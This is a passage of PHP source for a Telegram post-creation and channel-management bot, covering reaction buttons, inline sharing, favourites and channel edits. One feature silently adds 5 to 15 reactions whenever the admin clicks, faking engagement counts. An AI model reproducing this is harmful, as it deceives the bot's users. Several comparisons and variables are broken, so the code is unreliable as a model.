    if($text==$til["key_fav"] or $text==$til["create_post"] or $text==$til["language"] or $text==$til["add_menu"] or $text==$til["key_text"] or $text==$til["key_video"] or $text==$til["key_gif"] or $text==$til["key_photo"] or $text==$til["key_back"] or $text==$til["key_backup"] or $text==["key_goto"] or $text==$til["my_channel"] or $text==$til["add_channel"] or $text==$til["edit_photo"] or $text==$til["edit_name"] or $text==$til["edit_info"] or $text==$til["del_photo"] or $text==$til["show_alert"] or $text==$til["create_poll"] or $text=="/start"){
    exit();
    }else{
        bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_inline_url"],
        "parse_mode"=>"html",
        "reply_markup"=>$bekor,
    ]);
        if($text==$til["key_not"]){
          baza($chatid,"like",["status"=>"false"]);
        }else{
          baza($chatid,"like",["status"=>"true","text"=>$text]);
        }
        step($chatid,"post_text_url");
        } 
}

if($qadam=="post_text_url"){
if($text==$til["key_fav"] or $text==$til["create_post"] or $text==$til["language"] or $text==$til["add_menu"] or $text==$til["key_text"] or $text==$til["key_video"] or $text==$til["key_gif"] or $text==$til["key_photo"] or $text==$til["key_back"] or $text==$til["key_backup"] or $text==["key_goto"] or $text==$til["my_channel"] or $text==$til["add_channel"] or $text==$til["edit_photo"] or $text==$til["edit_name"] or $text==$til["edit_info"] or $text==$til["del_photo"] or $text==$til["show_alert"] or $text==$til["create_poll"] or $text=="/start"){
    exit();
    }else{

    if((ssilka($text)==true) or $text==$til["key_not"])
    {

        if($text!=$til["key_not"]){
           $klav = array();
          foreach(explode("\n",$text) as $key=>$tx){
            preg_match_all("|\[(.*)\]|U", $tx, $outs,PREG_SET_ORDER);
          foreach($outs as $keys=>$value){
                  $value = $value[1];
                  $button = explode("+",$value);
                $kinop = ["text" =>trim($button[0]),"url" =>trim($button[1])];
                  $klav[$key][$keys] = $kinop;
           }
           }
         baza($chatid,"keyboard",["status"=>"true","text"=>$klav]);
        }else{
         baza($chatid,"keyboard",["status"=>"false"]);
        }
       $base = getb($chatid);
       $uniqid = uniqid(true);
        if($base["like"]["status"]=="true"){
            $lk = [];
            $bz = [];
            $uff = $base["like"]["text"];
            $uff = explode("\n",$uff)[0];
            $son = explode("/",$uff);
          foreach ($son as $key => $value) {
                if($key<=6){
                $id = json_encode(["like"=>"false"]);
                $lik = ["text" =>trim($value),"callback_data" =>$id];
                $lk[$key] = $lik;
                $bz[$key] = [
                    "text"=>trim($value),
                    "callback_data" =>json_encode(["like"=>"true","e"=>$key,
                        "hash"=>$uniqid])
                ];
                }else{
                break;
           }
         }
           if($base["keyboard"]["status"]=="true"){
            $yb = array_merge([$bz],$base["keyboard"]["text"]);
            $utube = array_merge([$lk],$base["keyboard"]["text"]);
           }elseif($base["keyboard"]["status"]=="false"){
            $utube = [$lk];
            $yb = [$bz];
           }
        }elseif($base["keyboard"]["status"]=="true"){
            $utube = $base["keyboard"]["text"];
            $yb = $base["keyboard"]["text"];
        }else{
            $utube = [];
            $yb = [];
        }
       if($base["type"]=="text"){
        $turi = "Message";
        if($base["parse_mode"]=="html"){
          $parse = "html";
        }else{
          $parse = "markdown";
        }
        $content = [
          "text"=>$base["matn"],
          "parse_mode"=>$parse,
        "disable_web_page_preview"=>$base["view"],
        "reply_markup"=>json_encode([
            "inline_keyboard"=>$utube
        ])
         ];
       }else{
        $turi = $base["type"];
        if($base["parse_mode"]=="html"){
          $parse = "html";
        }else{
          $parse = "markdown";
        }
        if($base["caption"]["status"]=="true"){
            $content = [
            "$turi"=>$base["file_id"],
            //"parse_mode"=>$parse,
            "caption"=>$base["caption"]["text"],
            "reply_markup"=>json_encode([
            "inline_keyboard"=>$utube
        ])
         ];
        }else{
        $turi = $base["type"];
        $content = [
            "$turi"=>$base["file_id"],
            //"parse_mode"=>$parse,
            "reply_markup"=>json_encode([
            "inline_keyboard"=>$utube
        ])
         ];
     }
     }    
       bot("send".$turi,array_merge(["chat_id"=>$chatid],$content));
        $replay = json_encode([
            "inline_keyboard"=>$klav]);
        $read = bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_goto"],
        "parse_mode"=>"html",
        "reply_markup"=>json_encode([
            "resize_keyboard"=>true,
            "keyboard"=>[
                [["text"=>$til["key_backup"]],["text"=>$til["key_goto"]]]
            ]
        ])
    ]);
        baza($chatid,"hash",$uniqid);
        baza($chatid,"reply_markup",json_encode(["inline_keyboard"=>$yb]));
step($chatid,"post_preview");
}else{
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["parse_url_zero"],
        "parse_mode"=>"html",
        "reply_markup"=>$bekor,
    ]);
}
}
}
/*########### @UzWebDev ############*/
if($qadam=="post_preview" and $text==$til["key_goto"]){
    if($text==$til["key_fav"] or $text==$til["create_post"] or $text==$til["language"] or $text==$til["add_menu"] or $text==$til["key_text"] or $text==$til["key_video"] or $text==$til["key_gif"] or $text==$til["key_photo"] or $text==$til["key_back"] or $text==$til["key_backup"] or $text==["key_goto"] or $text==$til["my_channel"] or $text==$til["add_channel"] or $text==$til["edit_photo"] or $text==$til["edit_name"] or $text==$til["edit_info"] or $text==$til["del_photo"] or $text==$til["show_alert"] or $text==$til["create_poll"] or $text=="/start"){
    }else{
        $tokr = getb($chatid)["hash"];
step($chatid,"main");
bot("sendMessage",["chat_id"=>$chatid,"text"=>$til["post_end_text"],
"parse_mode"=>"html",
"reply_markup"=>$menu
]);
 bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>"<code>@$botname {$tokr}</code>",
        "parse_mode"=>"html",
        "reply_markup"=>json_encode([
            "inline_keyboard"=>[
                [["callback_data"=>"addbaza_".$tokr,"text"=>$til["add_key_fav"]]],
                [["switch_inline_query"=>$tokr,"text"=>$til["share"]]]
            ]
        ])
    ]);
 $b = getb($chatid);
if($b["like"]["status"]=="true"){
  $save =  [];
  $uff = $b["like"]["text"];
  $uff = explode("\n",$uff)[0];
  $son = explode("/",$uff);
  foreach ($son as $key => $value) {
    if($key<=6){
      $save["like"][$key]["count"] = 0;
      $save["like"][$key]["emoj"] = $value;
      $save["users"] = [];
    }else{
      break;
    }
   }
   baza($chatid,"content",$save);
  }
  baza($chatid,"lang",gset($chatid)["lang"]);
  addf($tokr,getb($chatid));
}
}

/*########### @UzWebDev ############*/
if(isset($update->callback_query)){
  $call = $update->callback_query;
  $tarf = gset($call->from->id)["lang"];
    if($tarf=="uz"){
      $til = $lang_uz;
    }elseif($tarf=="ru"){
      $til = $lang_ru;
    }elseif($tarf=="en"){
      $til = $lang_en;
    }else{
      $til = $lang_ru;
    }
    $js = json_decode($call->data,true);
    if($js["like"]=="true"){
    $imo = $js["e"];
    $id = $call->from->id;

    $lk = inline($js["hash"]);
    $users = $lk["content"]["users"];
    $tarf = $lk["lang"];
    if($tarf=="uz"){
      $til = $lang_uz;
    }elseif($tarf=="ru"){
      $til = $lang_ru;
    }elseif($tarf=="en"){
      $til = $lang_en;
    }else{
      $til = $lang_ru;
    }
    if(!in_array($id,$users)){
        $emo = $lk["content"]["like"][$imo]["emoj"];
        $alert = str_replace("{smile}",$emo,$til["like_alert"]);
        bot("answerCallbackQuery",[
        "callback_query_id"=>$call->id,
        "text"=>$alert,
        "show_alert"=>false
        ]);
        if($id==$admin){
        $lk["content"]["like"][$imo]["count"] += rand(5,15);
        }else{
     $lk["content"]["like"][$imo]["count"] +=1;
     $lk["content"]["users"] = array_merge($users,[$id]);
       }
    addf($js["hash"],$lk);
        bot("editMessageReplyMarkup",[
         "inline_message_id"=>$call->inline_message_id,
         "reply_markup"=>json_encode([
            "inline_keyboard"=>UzWebDev($js["hash"])
      ])
      ]);
     }else{
       bot("answerCallbackQuery",[
            "callback_query_id"=>$call->id,
            "text"=>$til["like_already"],
            "show_alert"=>true
        ]);
     } 
    }elseif($js["like"]=="false"){
        bot("answerCallbackQuery",[
            "callback_query_id"=>$call->id,
            "text"=>$til["more_friends"],
            "show_alert"=>true
        ]);
    }elseif(mb_stripos($data,"del_") !==false){
    $r = trim(explode("_",$data)[1]);   
        $t = fdel($call->from->id,$r);
        if($t=="true"){
           bot("editMessageText",[
        "chat_id"=>$update->callback_query->from->id,
        "text"=>$til["fav_del"],
        "parse_mode"=>"html",
        "message_id"=>$update->callback_query->message->message_id,  
    ]);
        }else{
          bot("editMessageText",[
        "chat_id"=>$update->callback_query->from->id,
        "message_id"=>$update->callback_query->message->message_id,
        "text"=>$til["fav_undel"],
        "parse_mode"=>"html",
    ]);
     }    
    }elseif(mb_stripos($call->data,"addbaza_")!==false){
       
        $kod = trim(explode("_",$call->data)[1]);
      $ty = getfav($call->from->id,$kod);
        if($ty=="true"){
           bot("answerCallbackQuery",[
            "callback_query_id"=>$call->id,
            "text"=>$til["already_save"],
            "show_alert"=>false
        ]);
        }elseif($ty=="false"){
        //fav($call->from->id,$kod,"true");
        baza($call->from->id,"fav_hash",$kod);
         bot("answerCallbackQuery",[
            "callback_query_id"=>$call->id
        ]);
        bot("sendMessage",[
            "chat_id"=>$call->from->id,
            "text"=>$til["save_fav_name"],
            "parse_mode"=>"html",
            "reply_markup"=>json_encode([
              "resize_keyboard"=>true,
              "keyboard"=>[
                [["text"=>$til["key_backup"]]]

              ]
            ])
        ]);
      step($call->from->id,"set_fav_name");
    }
    }elseif(mb_stripos($call->data,"key_") !==false){
         if($qadam=="post_text" or $qadam=="post_video" or $qadam=="post_gif" or $qadam=="post_photo"){
            $b = getb($call->from->id);
            if(explode("key_",$call->data)[1]=="markup"){
            if($b["parse_mode"]=="markdown"){
        baza($call->from->id,"parse_mode","html");
     }else{
       baza($call->from->id,"parse_mode","markdown");
     }
 }
     if(explode("key_",$call->data)[1]=="view"){
     if($b["view"]=="true"){
        baza($call->from->id,"view","false");
     }else{
       baza($call->from->id,"view","true");
     }
      }
     $b =  getb($call->from->id);
     if($b["parse_mode"]=="markdown"){
        $md = "Markdown";
     }else{
        $md = "HTML";
     }
     if($b["view"]=="false"){
        $tr = $til["on"];
     }else{
        $tr = $til["off"];
     }
    $rid = bot("editMessageReplyMarkup",[
        "chat_id"=>$call->from->id,
        "message_id"=>$b["id"],
        "reply_markup"=>json_encode([
            "inline_keyboard"=>[
                [[
                  "callback_data"=>"key_markup",
                  "text"=>$til["markup_format"].$md]],
                [[
                  "callback_data"=>"key_view",
                  "text"=>$til["markup_view"].$tr]]
            ]
        ])
    ]);
    bot("answerCallbackQuery",[
        "callback_query_id"=>$call->id,
         ]);
    }else{
        bot("deletemessage",[
            "chat_id"=>$call->from->id,
            "message_id"=>$b["id"]
        ]);
       bot("answerCallbackQuery",[
        "callback_query_id"=>$call->id,
         ]);
    }
}

}

/*########### @UzWebDev ############*/
$inline = $update->inline_query;
if(isset($inline)) {
    if(strlen($update->inline_query->query)>"1"){
      $inline = $update->inline_query->query;
    if(file_exists("click/$inline.json")){
    $get = inline($inline);
    $tarf = $get["lang"];
  if($tarf=="uz"){
    $til = $lang_uz;
  }elseif($tarf=="ru"){
     $til = $lang_ru;
  }elseif($tarf=="en"){
     $til = $lang_en;
  }else{
    $til = $lang_ru;
  }
  if($get["view"]=="true"){
    $view = true;
  }elseif($get["view"]=="false"){
    $view = false;
  }else{
    $view = false;
  }
  if($get["parse_mode"]=="markdown"){
            $parse = "markdown";
          }elseif($get["parse_mode"]=="html"){
            $parse = "html";
          }else{
            $parse = "markdown";
          }
      
    $content = [
            'inline_query_id'=>$update->inline_query->id,    
            'results'=>json_encode([[
                'type'=>'article',
                'id'=>base64_encode(rand(5,555)),
                'title'=>$til["inline_result_title"],
                'description'=>$til["inline_result_description"],
             'input_message_content'=>[
                'disable_web_page_preview'=>$view,
                'parse_mode'=>$parse,
                'message_text'=>$get['matn']
            ],
            'reply_markup'=>json_decode($get['reply_markup'],true),
          ]])
        ];
     
    if($get["type"]=="text") {
        bot('answerInlineQuery',$content);
    
    }
   
    if ($get["type"] == 'photo') {
    
        if($get["caption"]["status"]=="true"){
          
         $content = [
            'inline_query_id'=>$update->inline_query->id,    
            'results'=>json_encode([[
                'type'=>'photo',
                'id'=>base64_encode(rand(5,555)),
                'title'=>$til["inline_result_title"],
                'photo_file_id'=>$get['file_id'],
                'caption'=>$get['caption']["text"],
                'reply_markup'=>json_decode($get['reply_markup'],true),
                
          ]
      ])
        ];       
        }else{
            $content = [
            'inline_query_id'=>$update->inline_query->id,    
            'results'=>json_encode([[
                'type'=>'photo',
                'id'=>base64_encode(rand(5,555)),
                'title'=>$til["inline_result_title"],
                'photo_file_id'=>$get['file_id'],
                'reply_markup'=>json_decode($get['reply_markup'],true),
                
          ]
      ])
        ];
        }
        bot('answerInlineQuery',$content);
         exit();      
    }
    
    if ($get["type"] == 'video') {
        
        if($get["caption"]["status"]=="true"){
        $content = [
            'inline_query_id'=>$update->inline_query->id,    
            'results'=>json_encode([[
                'type'=>'video',
                'id'=>base64_encode(rand(5,555)),
                'title'=>$til["inline_result_title"],
                'video_file_id'=>$get['file_id'],
                'caption'=>$get['caption']["text"],
                'reply_markup'=>json_decode($get['reply_markup'],true),
                          ]
      ])
        ];
        }else{
          $content = [
            'inline_query_id'=>$update->inline_query->id,    
            'results'=>json_encode([[
                'type'=>'video',
                'id'=>base64_encode(rand(5,555)),
                'title'=>$til["inline_result_title"],
                'video_file_id'=>$get['file_id'],
                'reply_markup'=>json_decode($get['reply_markup'],true),
                
          ]
      ])
        ];
        }
        bot('answerInlineQuery',$content);
       exit(); 
    }

    if ($get["type"] == 'animation') {
    
        if($get["caption"]["status"]=="true"){
            $content = [
            'inline_query_id'=>$update->inline_query->id,    
            'results'=>json_encode([[
                'type'=>'gif',
                'id'=>base64_encode(rand(5,555)),
                'title'=>$til["inline_result_title"],
                'gif_file_id'=>$get['file_id'],
               'caption'=>$get['caption']["text"],
                'reply_markup'=>json_decode($get["reply_markup"]),
                
          ]
      ])
        ];
        }else{
            $content = [
            'inline_query_id'=>$update->inline_query->id,    
            'results'=>json_encode([[
                'type'=>'gif',
                'id'=>base64_encode(rand(5,555)),
                'title'=>$til["inline_result_title"],
                'gif_file_id'=>$get['file_id'],
                'reply_markup'=>json_decode($get["reply_markup"]),
              
          ]
      ])
        ];
        }
        bot('answerInlineQuery',$content);
        exit();
    }
    
    if ($get["type"] == 'audio') {
    
        if($get["caption"]["status"]=="true"){
            $content = [
            'inline_query_id'=>$update->inline_query->id,    
            'results'=>json_encode([[
                'type'=>'voice',
                'id'=>base64_encode(rand(5,555)),
                'audio_file_id'=>$get['file_id'],
               'caption'=>$get['caption']["text"],
                'reply_markup'=>json_decode($get["reply_markup"]),
                
          ]
      ])
        ];
        }else{
            $content = [
            'inline_query_id'=>$update->inline_query->id,    
            'results'=>json_encode([[
                'type'=>'audio',
                'id'=>base64_encode(rand(5,555)),
                'audio_file_id'=>$get['file_id'],
                'reply_markup'=>json_decode($get["reply_markup"]),
              
          ]
      ])
        ];
        }
        bot('answerInlineQuery',$content);
        exit();
    }

    if ($get["type"] == 'sticker') {
    
        if($get["caption"]["status"]=="true"){
          
         $content = [
            'inline_query_id'=>$update->inline_query->id,    
            'results'=>json_encode([[
                'type'=>'sticker',
                'id'=>base64_encode(rand(5,555)),
                'sticker_file_id'=>$get['file_id'],
                'reply_markup'=>json_decode($get['reply_markup'],true),
                
          ]
      ])
        ];       
        }else{
            $content = [
            'inline_query_id'=>$update->inline_query->id,    
            'results'=>json_encode([[
                'type'=>'sticker',
                'id'=>base64_encode(rand(5,555)),
                'sticker_file_id'=>$get['file_id'],
                'reply_markup'=>json_decode($get['reply_markup'],true),
                
          ]
      ])
        ];
        }
        bot('answerInlineQuery',$content);
         exit();      
    }

  }else{
       bot('answerInlineQuery', [
'inline_query_id'=>$update->inline_query->id,
'switch_pm_text'=>"Create a post",
'switch_pm_parameter'=>"post",
]);
  }   
}else{
 bot('answerInlineQuery', [
'inline_query_id'=>$update->inline_query->id,
'switch_pm_text'=>"Create a post",
'switch_pm_parameter'=>"post",
]); 
}
}

if($text==$til["add_menu"] and $qadam=="main"){
  step($chatid,"cat_chan");
     bot("sendMessage",[
     "chat_id"=>$chatid,
     "text"=>$til["add_menu_text"],
     "parse_mode"=>"html",
     "reply_markup"=>$addmenu,
     ]);
}

if($text==$til["add_channel"] and $qadam=="cat_chan"){
  step($chatid,"add_cat_chan");
bot("sendMessage",[
"chat_id"=>$chatid,
"text"=>$til["channel_text"],
"parse_mode"=>"html",
"reply_markup"=>$back,
]);
}

if($qadam=="add_cat_chan"){
  if($text==$til["key_back"] or $text=="/start"){ 
    exit();
  }else{
    $for  = $message->forward_from_chat;
$fid = $for->id;
$fusername = $for->username;
$type = $for->type;

if($type=="channel"){
$get = bot("getChatMember",[
"chat_id"=>$forwardid,
"user_id"=>$message->from->id,
])->result->status;
if(!is_file("channel/$chatid.id") or !is_file("channel/$chatid.channel")){
  if($get=="administrator" or $get=="creator"){
   step($chatid,"main");
    bot("sendMessage",[
  "chat_id"=>$chatid,
  "text"=>$til["result_channel"],
  "parse_mode"=>"html",
  "reply_markup"=>$menu,
]);
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"Yangi kanal keldi, kim qushdi ID: $fadmin
     Kanal ID: $fid 
      Title: $ftitle
      Username: @$fusername",
]);

$list = explode("\n",trim(file_get_contents("list/list.user")));
if(!in_array($username_channel,$list)){
  file_put_contents("list/list.user","\n".$username_channel,FILE_APPEND);
}
   file_put_contents("channel/$chatid.channel",$username_channel);
   file_put_contents("channel/$chatid.id",$forwardid);
}else{
bot("sendMessage",[
  "chat_id"=>$chatid,
  "text"=>$til["creator_needed"],
  "parse_mode"=>"html",
]);
}
}else{
 bot("sendMessage",[
  "chat_id"=>$chatid,
  "text"=>$til["there_channel"],
  "parse_mode"=>"html",
]);
}
}else{
bot("sendMessage",[
  "chat_id"=>$chatid,
  "text"=>$til["forward_message"],
  "parse_mode"=>"html",
]);
}
}
}
/*########### @UzWebDev ############*/
if($text==$til["my_channel"] && $qadam=="cat_chan"){
if(is_file("channel/$chatid.channel") !=null){
  if(!$info){
    $no_info = $til["no_info"];
  }else{
    $no_info = "$info";
  };
$read = bot("sendMessage",[
    "chat_id"=>$chatid,
"text"=>$til['channel_username']." @$username\n".$til['channel_id']." <pre>$channelid</pre>\n".$til['info_channel']."\n$no_info\n".$til['count_channel']." $count\n".$til['channel_name']." $title\n",
"parse_mode"=>"html",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"♻️ $title","url"=>"https://t.me/$username"],],
[["text"=>$til["settings_channel"],"callback_data"=>"setchannel"],],
[["text"=>$til["send_message"],"callback_data"=>"sendchannel"],],
[["text"=>$til["del_channel"],"callback_data"=>"delchannel"],],
]
]),
])->result->message_id;
 file_put_contents("channel/$chatid.del",$read);
}else{
  bot("sendMessage",[
    "chat_id"=>$chatid,
    "text"=>$til["no_channel"],
    "parse_mode"=>"html",
  ]);
}
}

if($callbackdata=="delchannel"){
unlink("channel/$chat_id.channel");
unlink("channel/$chat_id.id");
bot("deleteMessage",[
  "chat_id"=>$chat_id,
  "message_id"=>$message_id,
]);
  bot("sendMessage",[
    "chat_id"=>$chat_id,
    "text"=>$til["delete_channel"],
    "parse_mode"=>"html",
  ]);
}

if($text=="♻️ Kanallar roʻyxati" and $chatid==in_array($chatid,$creator)){
$list = trim(file_get_contents("list/list.user"));
$count_channel = substr_count($list,"\n");
$for = explode("\n",$list);
$keyboard = [];
foreach($for as $key=>$value){
  $json = json_encode(["username"=>$value]);
$keyboard["inline_keyboard"][$key] = [["callback_data"=>$json,"text"=>$value]];
}
bot("sendMessage",[
"chat_id"=>$chatid,
"text"=>"*Kanallar roʻyxati:*\n*Kanallar soni: $count_channel*\n",
"parse_mode"=>"markdown",
"reply_markup"=>json_encode($keyboard)
]);
}

if($callbackdata=="setchannel"){
  step($chat_id,"cat_chan_menu");
bot('deletemessage',[
     "chat_id"=>$chat_id,
"message_id"=>$message_id,
]);
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>$til["add_menu_text"],
"parse_mode"=>"html",
"reply_markup"=>json_encode([
"resize_keyboard"=>true,
    "keyboard"=>[
[["text"=>$til["edit_photo"]],],
[["text"=>$til["edit_name"]],],
[["text"=>$til["edit_info"]],],
[["text"=>$til["del_photo"]],],
[["text"=>$til["show_alert"]],],
[["text"=>$til["create_poll"]],],
[["text"=>$til["key_back"]],],
]
]),
]);  
}

if($text==$til["edit_name"] && $qadam=="cat_chan_menu"){
step($chatid,"kanal_nomi");
                  bot("sendmessage",[
                    "chat_id"=>$chatid,
                    "text"=>$til['edit_name_text']." <b>$title</b>\n",
'parse_mode'=>"html",
'reply_markup'=>$back,
]);
         }
     
if($qadam=="kanal_nomi"){
if($text==$til["key_fav"] or $text==$til["create_post"] or $text==$til["language"] or $text==$til["add_menu"] or $text==$til["key_text"] or $text==$til["key_video"] or $text==$til["key_gif"] or $text==$til["key_photo"] or $text==$til["key_back"] or $text==$til["key_backup"] or $text==["key_goto"] or $text==$til["my_channel"] or $text==$til["add_channel"] or $text==$til["edit_photo"] or $text==$til["edit_name"] or $text==$til["edit_info"] or $text==$til["del_photo"] or $text==$til["show_alert"] or $text==$til["create_poll"] or $text=="/start"){
}else{  
 bot("setChatTitle", [
    "chat_id"=>$channelid,
"title"=>$text,
]);
bot("sendMessage", [
    "chat_id"=>$chatid,
"text"=>"Kanalingiz nomi: <b>$text</b> ga oʻzgartirildi!",
"parse_mode"=>"html",
]);
bot("sendMessage", [
    "chat_id"=>$chatid,
"text"=>"<b>Xush kelibsiz!</b>",
"parse_mode"=>"html",
  "reply_markup"=>$menu,
]);
unlink("channel/$chatid.step");
step($chatid,"main"); 
}
}

if($text==$til["edit_info"] && $qadam=="cat_chan_menu"){
step($chatid,"kanal_infosi");
                  bot("sendMessage",[
                    "chat_id"=>$chatid,
                    "text"=>"Kanal infosini yozing. Siz infosini oʻzgartirmoqchi boʻlgan kanal: <b>$title</b>",
'parse_mode'=>"html",
'reply_markup'=>$back,
]);
         }
     
if($qadam=="kanal_infosi"){  
if($text==$til["key_fav"] or $text==$til["create_post"] or $text==$til["language"] or $text==$til["add_menu"] or $text==$til["key_text"] or $text==$til["key_video"] or $text==$til["key_gif"] or $text==$til["key_photo"] or $text==$til["key_back"] or $text==$til["key_backup"] or $text==["key_goto"] or $text==$til["my_channel"] or $text==$til["add_channel"] or $text==$til["edit_photo"] or $text==$til["edit_name"] or $text==$til["edit_info"] or $text==$til["del_photo"] or $text==$til["show_alert"] or $text==$til["create_poll"] or $text=="/start"){}else{  
   bot("setChatDescription",[
    "chat_id"=>$channelid,
    "description"=>$text,
]);
bot("sendMessage",[
    "chat_id"=>$chatid,
"text"=>"Kanalingiz infosi: <b>$text</b> ga oʻzgartirildi!",
"parse_mode"=>"html",
]);
bot("sendMessage",[
    "chat_id"=>$chatid,
"text"=>"<b>Xush kelibsiz!</b>",
"parse_mode"=>"html",
  'reply_markup'=>$menu,
]);
unlink("channel/$chatid.step");
step($chatid,"main");
}
}

if($text==$til["create_poll"] &&$qadam=="cat_chan_menu"){
step($chatid,"title");
                  bot("sendMessage",[
                    "chat_id"=>$chatid,
                    "text"=>"Kanal uchun poll yozing. Siz poll yubormoqchi boʻlgan kanal: <b>$title</b>",
"parse_mode"=>"html",
"reply_markup"=>$back,
]);
         }

if($qadam=="title"){
if($text==$til["key_fav"] or $text==$til["create_post"] or $text==$til["language"] or $text==$til["add_menu"] or $text==$til["key_text"] or $text==$til["key_video"] or $text==$til["key_gif"] or $text==$til["key_photo"] or $text==$til["key_back"] or $text==$til["key_backup"] or $text==["key_goto"] or $text==$til["my_channel"] or $text==$til["add_channel"] or $text==$til["edit_photo"] or $text==$til["edit_name"] or $text==$til["edit_info"] or $text==$til["del_photo"] or $text==$til["show_alert"] or $text==$til["create_poll"] or $text=="/start"){
}else{
  file_put_contents("channel/$chatid.title",$text);
bot("sendMessage",[
"chat_id"=>$chatid,
"text"=>"Pol yasash uchun na'muna: \nSalom\nZo'r\nyoqdi\nYoqmadi"
]);
step($chatid,"poll");
}
}

if($qadam=="poll"){  
if($text==$til["key_fav"] or $text==$til["create_post"] or $text==$til["language"] or $text==$til["add_menu"] or $text==$til["key_text"] or $text==$til["key_video"] or $text==$til["key_gif"] or $text==$til["key_photo"] or $text==$til["key_back"] or $text==$til["key_backup"] or $text==["key_goto"] or $text==$til["my_channel"] or $text==$til["add_channel"] or $text==$til["edit_photo"] or $text==$til["edit_name"] or $text==$til["edit_info"] or $text==$til["del_photo"] or $text==$til["show_alert"] or $text==$til["create_poll"] or $text=="/start"){}else{  
  $tit = trim(file_get_contents("channel/$chatid.title"));
 
  $r = explode("\n",$text);
  $root = [];
  foreach($r as $key=>$value){
    if($key<=10 and $value!=""){
    $root[$key] = $value;
}else{
  break;
}
  }
     bot("sendPoll",[
     "chat_id"=>$channelid,
     "question"=>$tit,
     "options"=>json_encode($root)
     ]);
bot("sendMessage",[
    "chat_id"=>$chatid,
"text"=>"Poll kanalingizga yuborildi!",
]);
bot("sendMessage",[
    "chat_id"=>$chatid,
"text"=>"<b>Xush kelibsiz!</b>",
"parse_mode"=>"html",
  'reply_markup'=>$menu,
]);
unlink("channel/$chatid.step");
unlink("channel/$chatid.title");
step($chatid,"main"); 
}
}

if($text==$til["edit_photo"] && $qadam=="cat_chan_menu"){
step($chatid,"kanal_rasmi");
                  bot("sendMessage",[
                    "chat_id"=>$chatid,
                    "text"=>"Kanalingiz uchun yangi rasm yuboring. Siz rasmini oʻzgartirmoqchi boʻlgan kanal: <b>$title</b>",
'parse_mode'=>"html",
'reply_markup'=>$back,
]);
         }
 /*########### @UzWebDev ############*/
if($qadam=="kanal_rasmi"){  
$kanal_rasmi = $message->photo[1]->file_id;
file_put_contents("channel/$chatid.photo","\n".$kanal_rasmi,FILE_APPEND);
file_put_contents("channel/$chatid.photo",$kanal_rasmi);
$photo = file_get_contents("channel/$chatid.photo");
if($text==$til["key_fav"] or $text==$til["create_post"] or $text==$til["language"] or $text==$til["add_menu"] or $text==$til["key_text"] or $text==$til["key_video"] or $text==$til["key_gif"] or $text==$til["key_photo"] or $text==$til["key_back"] or $text==$til["key_backup"] or $text==["key_goto"] or $text==$til["my_channel"] or $text==$til["add_channel"] or $text==$til["edit_photo"] or $text==$til["edit_name"] or $text==$til["edit_info"] or $text==$til["del_photo"] or $text==$til["show_alert"] or $text==$til["create_poll"] or $text=="/start"){
}else{  
 bot("setChatPhoto",[
    "chat_id"=>$channelid,
"photo"=>$photo,
]);
bot("sendPhoto",[
    "chat_id"=>$chatid,
"photo"=>$photo,
"caption"=>"<b>Kanalingiz rasmi oʻzgartirildi!</b>",
"parse_mode"=>"html",
]);
bot("sendMessage",[
    "chat_id"=>$chatid,
"text"=>"<b>Xush kelibsiz!</b>",
"parse_mode"=>"html",
  'reply_markup'=>$menu,
]);
unlink("channel/$chatid.step");
step($chatid,"main");
}
}
/*Copyright by @UzWebDev for @UzBots_Robot*/